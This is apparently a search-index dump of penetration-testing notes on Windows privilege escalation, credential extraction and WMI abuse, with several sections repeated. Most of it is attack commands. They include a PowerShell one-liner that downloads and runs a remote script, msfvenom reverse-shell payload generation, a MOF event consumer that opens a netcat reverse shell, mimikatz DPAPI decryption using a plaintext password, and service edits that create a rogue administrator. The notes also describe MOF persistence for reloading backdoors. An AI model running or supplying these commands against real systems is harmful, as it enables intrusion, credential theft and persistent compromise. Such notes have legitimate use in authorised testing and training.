password: gpp-decrypt $cpassword Get-GPPPassword Get-NetOU -GUID {4C86DD57-4040-41CD-B163-58F208A26623} | %{ Get-NetComputer -ADSPath $_ } // All OUs connected to policy | List all domain machines tied to OU Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899 Token Impersonation PowerSploit / Incognito List all tokens Invoke-TokenManipulation -ShowAll List all unique and usable tokens Invoke-TokenManipulation -Enumerate Start new process with token of a user Invoke-TokenManipulation -ImpersonateUser -Username domain\\user Start new process with token of another process Invoke-TokenManipulation -CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe -ProcessId 500 cmdkey Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey /list Run a command as admin: runas /user:ACCESS\\Administrator /savecred \u200b powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1') Find all runas shortcuts: Get-ChildItem\u200b \u200b C:\\ \u200b *.lnk -Recurse -Force | ft fullname | \u200b Out-File\u200b shortcuts.txt ForEach\u200b ( \u200b $file\u200b \u200b in\u200b gc .\\shortcuts.txt) { \u200b Write-Output\u200b \u200b $file\u200b ; gc \u200b $file\u200b | Select-String\u200b runas } Windows Data Protection API Locating credential files cmd\u200b /c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [Convert]::ToBase64String([IO.File]::ReadAllBytes(\u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [IO.File]::WriteAllBytes(\u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [Convert]::FromBase64String(\u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Examine master key file dpapi::\u200b masterkey\u200b /\u200b in\u200b :0792\u200b c32e\u200b -48\u200b a5\u200b -4\u200b fe3\u200b -8\u200b b43\u200b - \u200b d93d64590580 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 Using Kernel Exploit Installed updates: wmic qfe get Caption,Description,HotFixID,InstalledOn KiTrap0d References https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"Privilege Escalation"},{"location":"os/windows/privilege-escalation/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"os/windows/privilege-escalation/#options","text":"Missing Patches Automated Deployment and Auto Logon Passwords AlwaysInstallElevated (any user can run MSI as SYSTEM) Misconfigured Services","title":"Options"},{"location":"os/windows/privilege-escalation/#guides","text":"https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html","title":"Guides"},{"location":"os/windows/privilege-escalation/#tools","text":"https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb","title":"Tools"},{"location":"os/windows/privilege-escalation/#metasploit","text":"In 32bit systems: local_exploit_suggester In 64bit systems: search exploit/windows/local","title":"Metasploit"},{"location":"os/windows/privilege-escalation/#powerup","text":"PowerUp to check for all service misconfigurations: Invoke-AllChecks","title":"PowerUp"},{"location":"os/windows/privilege-escalation/#service-unquoted-path","text":"Get-ServiceUnquoted -Verbose Get-WmiObject -Class win32_service | f` * When service path is unquoted: C:\\PROGRAM FILES\\SUB DIR\\PROGRAM NAME Areas we can place files for exploit are marked with * C:\\PROGRAM*FILES\\SUB*DIR\\PROGRAM*NAME Examples: c:\\program.exe files\\sub dir\\program name c:\\program files\\sub.exe dir\\program name c:\\program files\\sub dir\\program.exe name","title":"Service Unquoted Path"},{"location":"os/windows/privilege-escalation/#service-binary-in-a-location-writable-to-current-user","text":"Replace the binary to gain code execution. Get-ModifiableServiceFile -Verbose","title":"Service binary in a location writable to current user"},{"location":"os/windows/privilege-escalation/#service-can-be-modified-by-current-user","text":"Get-ModifiableService -Verbose","title":"Service can be modified by current user"},{"location":"os/windows/privilege-escalation/#techniques","text":"","title":"Techniques"},{"location":"os/windows/privilege-escalation/#service-unquoted-path_1","text":"exploit/windows/local/trusted_service_path wmic service get name,displayname,pathname,startmode |findstr /i Auto |findstr /i /v C:\\Windows\\\\ |findstr /i /v C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Leads to running: C:\\Program.exe C:\\Program Files.exe C:\\Program Files (x86)\\Program.exe C:\\Program Files (x86)\\Program Folder\\A.exe C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe Insecure Setup: C:\\Windows\\System32 sc create Vulnerable Service binPath= C:\\Program Files (x86)\\Program Folder\\A Subfolder\\Executable.exe start=auto C:\\Windows\\System32 cd C:\\Program Files (x86) C:\\Program Files (x86) mkdir Program Folder\\A Subfolder C:\\Program Files (x86) icacls C:\\Program Files (x86)\\Program Folder /grant Everyone:(OI)(CI)F /T","title":"Service Unquoted Path"},{"location":"os/windows/privilege-escalation/#folder-service-executable-privileges","text":"When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\\Authenticated Users:(I)(M)) So any application that gets installed on the root can be tampered with by a non-admin user. If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one. https://msdn.microsoft.com/en-us/library/bb727008.aspx If folder is writable, drop a exe and use \"Service Unquoted Path\" to execute: icacls C:\\Program Files (x86)\\Program Folder If service exe is writable to everyone, low privilege user can replace the exe with some other binary: icacls example.exe F = Full Control CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE. OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.","title":"Folder &amp; Service Executable Privileges"},{"location":"os/windows/privilege-escalation/#service-permissions","text":"exploit/windows/local/service_permissions","title":"Service Permissions"},{"location":"os/windows/privilege-escalation/#approach-1-check-permissions-of-service","text":"subinacl.exe /keyreg HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service /display If service is editable, change the ImagePath to another exe. reg add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service /t REG_EXPAND_SZ /v ImagePath /d C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe /f or create a local admin with: sc config Vulnerable Service binpath= net user eviladmin P4ssw0rd@ /add sc config Vulnerable Service binpath= net localgroup Administrators eviladmin /add","title":"Approach 1 - Check permissions of service"},{"location":"os/windows/privilege-escalation/#approach-2-check-services-a-given-user-can-edit","text":"accesschk.exe -uwcqv testuser *","title":"Approach 2 - Check services a given user can edit"},{"location":"os/windows/privilege-escalation/#alwaysinstallelevated","text":"exploit/windows/local/always_install_elevated [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] AlwaysInstallElevated =dword:00000001 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Installing MSI: msiexec /quiet /qn /i malicious.msi Payload Generation: msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe msfvenom -f msi-nouac -p windows/exec cmd= C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe malicious.msi","title":"AlwaysInstallElevated"},{"location":"os/windows/privilege-escalation/#task-scheduler","text":"On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. Works only on Windows 2000, XP, or 2003 Must have local administrator net start Task Scheduler time at 06:42 /interactive C:\\Documents and Settings\\test\\Local Settings\\Temp\\Payload.exe","title":"Task Scheduler"},{"location":"os/windows/privilege-escalation/#dll-hijacking-dll-preloading-attack-or-a-binary-planting-attack","text":"https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in Dynamic-Link Library Search Order. The directory from which the application loaded. The system directory. The 16-bit system directory. The Windows directory. The current directory. The directories that are listed in the PATH environment variable. Services running under SYSTEM does not search through user path environment. Identify processes / services - Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx). - Filter Result = NAME NOT FOUND and Path ends with dll - Look at the registry key ServiceDll of services ( Parameters ).","title":"DLL Hijacking (DLL preloading attack or a binary planting attack)"},{"location":"os/windows/privilege-escalation/#windows-7","text":"IKE and AuthIP IPsec Keying Modules (IKEEXT) \u2013 wlbsctrl.dll Windows Media Center Receiver Service (ehRecvr) \u2013 ehETW.dll Windows Media Center Scheduler Service (ehSched) \u2013 ehETW.dll Can run Media Center services over command line: schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\mcupdate\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\MediaCenterRecoveryTask\u201d schtasks.exe /run /I /TN \u201c\\Microsoft\\Windows\\Media Center\\ActivateWindowsSearch\u201d","title":"Windows 7"},{"location":"os/windows/privilege-escalation/#windows-xp","text":"Automatic Updates (wuauserv) \u2013 ifsproxy.dll Remote Desktop Help Session Manager (RDSessMgr) \u2013 SalemHook.dll Remote Access Connection Manager (RasMan) \u2013 ipbootp.dll Windows Management Instrumentation (winmgmt) \u2013 wbemcore.dll Audio Service (STacSV) \u2013 SFFXComm.dll SFCOM.DLL Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) \u2013 DriverSim.dll Juniper Unified Network Service(JuniperAccessService) \u2013 dsLogService.dll Encase Enterprise Agent \u2013 SDDisk.dll","title":"Windows XP"},{"location":"os/windows/privilege-escalation/#migrations","text":"","title":"Migrations"},{"location":"os/windows/privilege-escalation/#cwdillegalindllsearch","text":"Allow user to change DLL search path algorithm [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] CWDIllegalInDllSearch 1, 2 or ffffffff ? The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ dlls not loaded ] The current working directory (CWD) Directories in the PATH environment variable (system then user)","title":"CWDIllegalInDllSearch"},{"location":"os/windows/privilege-escalation/#setdlldirectory","text":"Removes the current working directory (CWD) from the search order SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) : The directory from which the application loaded [ added ] C:\\program files\\MyApp\\ 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ removed ] The current working directory (CWD) Directories in the PATH environment variable (system then user) SetDllDirectory(\"\") The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) [ removed ] The current working directory (CWD) Directories in the PATH environment variable (system then user)","title":"SetDllDirectory"},{"location":"os/windows/privilege-escalation/#safedllsearchmode","text":"Enabled by default Can disable using [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager] Calling the SetDllDirectory(\u201c\u201d) or SetDllDirectory(\u201cC:\\program files\\MyApp\\\u201d) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.","title":"SafeDllSearchMode"},{"location":"os/windows/privilege-escalation/#dev","text":"LoadLibraryEx (additional argument) SetEnvironmentVariable(TEXT(\u201cPATH\u201d),NULL) Change default installation folder to C:\\Program Files Fully qualified path when loading DLLs Use SetDllDirectory(\u201c\u201d) API removing the current working directory from the search order If software needs to be installed on the root check there are no binaries needing SYSTEM privileges If SYSTEM privileges are required then change the ACL\u2019s of the folder Remove the path entry from the SYSTEM path variable if not needed When enabled The directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) Directories in the PATH environment variable (system then user) When disabled The directory from which the application loaded [ moved up the list ] The current working directory (CWD) 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) Directories in the PATH environment variable (system then user)","title":"DEV"},{"location":"os/windows/privilege-escalation/#stored-credentials","text":"C:\\unattend.xml C:\\sysprep.inf C:\\sysprep\\sysprep.xml dir c:\\*vnc.ini /s /b /c dir c:\\*ultravnc.ini /s /b /c dir c:\\ /s /b /c | findstr /si *vnc.ini findstr /si password *.txt | *.xml | *.ini findstr /si pass *.txt | *.xml | *.ini","title":"Stored Credentials"},{"location":"os/windows/privilege-escalation/#unattended-installations","text":"post/windows/gather/enum_unattend Look for UserAccounts tag of Unattend.xml , sysprep.xml and sysprep.inf across the system, including: C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ Microsoft appends \"Password\" to all passwords within Unattend files before encoding them.","title":"Unattended Installations"},{"location":"os/windows/privilege-escalation/#group-policy-preferences-gpp","text":"Introduced from Windows Server 2008 GPP allows for configuration of Domain-attached machines via group policy . GPPs are stored in the SYSVOL share, which is world-readable to authenticated users. Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the logged-in user and pull down policies. Group Policies for account management are stored on the Domain Controller in Groups.xml files buried in the SYSVOL folder cpassword is used to set passwords for the Local Administrator account. Password is AES encrypted using a published key: https://msdn.microsoft.com/en-us/library/Cc422924.aspx Metasploit: post/windows/gather/credentials/gpp PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 Decrypt encrypted password: gpp-decrypt $cpassword Get-GPPPassword Get-NetOU -GUID {4C86DD57-4040-41CD-B163-58F208A26623} | %{ Get-NetComputer -ADSPath $_ } // All OUs connected to policy | List all domain machines tied to OU Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899","title":"Group Policy Preferences (GPP)"},{"location":"os/windows/privilege-escalation/#token-impersonation","text":"PowerSploit / Incognito List all tokens Invoke-TokenManipulation -ShowAll List all unique and usable tokens Invoke-TokenManipulation -Enumerate Start new process with token of a user Invoke-TokenManipulation -ImpersonateUser -Username domain\\user Start new process with token of another process Invoke-TokenManipulation -CreateProcess C:\\Windown\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe -ProcessId 500","title":"Token Impersonation"},{"location":"os/windows/privilege-escalation/#cmdkey","text":"Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey /list Run a command as admin: runas /user:ACCESS\\Administrator /savecred \u200b powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1') Find all runas shortcuts: Get-ChildItem\u200b \u200b C:\\ \u200b *.lnk -Recurse -Force | ft fullname | \u200b Out-File\u200b shortcuts.txt ForEach\u200b ( \u200b $file\u200b \u200b in\u200b gc .\\shortcuts.txt) { \u200b Write-Output\u200b \u200b $file\u200b ; gc \u200b $file\u200b | Select-String\u200b runas }","title":"cmdkey"},{"location":"os/windows/privilege-escalation/#windows-data-protection-api","text":"Locating credential files cmd\u200b /c \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Local\\Microsoft\\Protect \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Vault \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Credentials \u200b dir\u200b /S /AS C:\\Users\\security\\AppData\\Roaming\\Microsoft\\Protect Transfer [Convert]::ToBase64String([IO.File]::ReadAllBytes(\u200b C:\\Users\\security\\AppData\\Roamin g\\Microsoft\\Credentials\\51AB168BE4BDB3A603DADE4F8CA81290 \u200b )) [IO.File]::WriteAllBytes(\u200b 51AB168BE4BDB3A603DADE4F8CA81290 \u200b , [Convert]::FromBase64String(\u200b AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6 VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7 c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ == \u200b )) Extraction credential file - masterkey (guidMasterKey) - https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Examine master key file dpapi::\u200b masterkey\u200b /\u200b in\u200b :0792\u200b c32e\u200b -48\u200b a5\u200b -4\u200b fe3\u200b -8\u200b b43\u200b - \u200b d93d64590580 /\u200b sid:S\u200b -1-5-21-953262931-566350628-63446256-1001 /\u200b password\u200b :4\u200b Cc3ssC0ntr0ller Decrypt credential blob dpapi::\u200b cred\u200b /\u200b in\u200b :51\u200b AB168BE4BDB3A603DADE4F8CA81290","title":"Windows Data Protection API"},{"location":"os/windows/privilege-escalation/#using-kernel-exploit","text":"Installed updates: wmic qfe get Caption,Description,HotFixID,InstalledOn KiTrap0d","title":"Using Kernel Exploit"},{"location":"os/windows/privilege-escalation/#references","text":"https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.greyhathacker.net/?p=738 https://toshellandback.com/2015/11/24/ms-priv-esc https://www.toshellandback.com/2015/08/30/gpp/","title":"References"},{"location":"os/windows/wmi/","text":"WMI Implementation of Web-Based Enterprise Management (WBEM) WBEM standard encompasses the design of an extensible enterprise data-collection and data-management facility that has the flexibility and extensibility required to manage local and remote systems that comprise arbitrary components WMI consists of four main components: management applications WMI infrastructure providers managed objects (system, disks, processes, network components...) Allows Execute some code when the notification of an event http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html CIM - Common Information Model WMI repository - stores CIM classes' definitions CIM classes hierarchically organized with subclasses grouped in namespaces (logical group of classes) root\\cimv2 includes most of the classes that represent computer's resources Interesting CIM classes __EventFilter [ create ]: permits to define a Windows event __EventConsumer : (abstract consumer class) ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root\\subscription ) Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server Vista , it is running under the LOCAL_SERVICE user __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs) MOF (Managed Object Format) Language used to describe CIM classes MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Compilation Compiled using mofcomp.exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent\\ AND TargetInstance.LogFile=\\ Application\\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { Name = CLASS_FIRST_TEST ; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript.Shell\\ )\\n objShell.Run \\ C:\\\\Windows\\\\system32\\\\cmd.exe /C C:\\\\nc.exe 192.168.38.1 1337 -e C:\\\\Windows\\\\system32\\\\cmd.exe\\ \\n ; }; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; }; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [key] string Name; }; instance of __EventFilter as $FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass\\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { // ... }; instance of __FilterToConsumerBinding { // ... }; instance of WoootClass { Name = Woot ; }; Usages Automatically kill some processes as soon as they are launched (anti-rootkits...), Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), Automatically infect USB devices List all the systems within the current environment/directory SELECT ds_cn FROM ds_computer Tools WMI Object Browser: References Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows","title":"WMI"},{"location":"os/windows/wmi/#wmi","text":"Implementation of Web-Based Enterprise Management (WBEM) WBEM standard encompasses the design of an extensible enterprise data-collection and data-management facility that has the flexibility and extensibility required to manage local and remote systems that comprise arbitrary components WMI consists of four main components: management applications WMI infrastructure providers managed objects (system, disks, processes, network components...) Allows Execute some code when the notification of an event http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html CIM - Common Information Model WMI repository - stores CIM classes' definitions CIM classes hierarchically organized with subclasses grouped in namespaces (logical group of classes) root\\cimv2 includes most of the classes that represent computer's resources","title":"WMI"},{"location":"os/windows/wmi/#interesting-cim-classes","text":"__EventFilter [ create ]: permits to define a Windows event __EventConsumer : (abstract consumer class) ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root\\subscription ) Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server Vista , it is running under the LOCAL_SERVICE user __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)","title":"Interesting CIM classes"},{"location":"os/windows/wmi/#mof-managed-object-format","text":"Language used to describe CIM classes MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Compilation Compiled using mofcomp.exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent\\ AND TargetInstance.LogFile=\\ Application\\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { Name = CLASS_FIRST_TEST ; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript.Shell\\ )\\n objShell.Run \\ C:\\\\Windows\\\\system32\\\\cmd.exe /C C:\\\\nc.exe 192.168.38.1 1337 -e C:\\\\Windows\\\\system32\\\\cmd.exe\\ \\n ; }; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; }; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [key] string Name; }; instance of __EventFilter as $FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass\\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { // ... }; instance of __FilterToConsumerBinding { // ... }; instance of WoootClass { Name = Woot ; };","title":"MOF (Managed Object Format)"},{"location":"os/windows/wmi/#usages","text":"Automatically kill some processes as soon as they are launched (anti-rootkits...), Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), Automatically infect USB devices","title":"Usages"},{"location":"os/windows/wmi/#list-all-the-systems-within-the-current-environmentdirectory","text":"SELECT ds_cn FROM ds_computer","title":"List all the systems within the current environment/directory"},{"location":"os/windows/wmi/#tools","text":"WMI Object Browser:","title":"Tools"},{"location":"os/windows/wmi/#references","text":"Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows","title":"References"},{"location":"os/windows/x-Bypass/","text":"Defense Bypass References ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752","title":"Defense Bypass"},{"location":"os/windows/x-Bypass/#defense-bypass","text":"","title":"Defense Bypass"},{"location":"os/windows/x-Bypass/#references","text":"ftp.exe to open processes: https://twitter.com/yeyint_mth/status/1009732492138442752","title":"References"},{"location":"os/windows/x-Defense/","text":"Defense References Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/ Server Security https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance","title":"Defense"},{"location":"os/windows/x-Defense/#defense","text":"","title":"Defense"},{"location":"os/windows/x-Defense/#references","text":"Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/","title":"References"},{"location":"os/windows/x-Defense/#server-security","text":"https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance","title":"Server Security"},{"location":"os/windows/y-Tools/","text":"Tools ntdsXtract Active Directory forensic framework -\u200b https://github.com/csababarta/ntdsxtract Extract users from ESE DB export: dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc Practice: - HTB: Kotarak LibEseDB libesedb is a library to access the Extensible Storage Engine (ESE) Database File (EDB) format. The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc. https://github.com/libyal/libesedb Dump tables: esedbexport -m tables 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit Practice: - HTB: Kotarak WinEXE 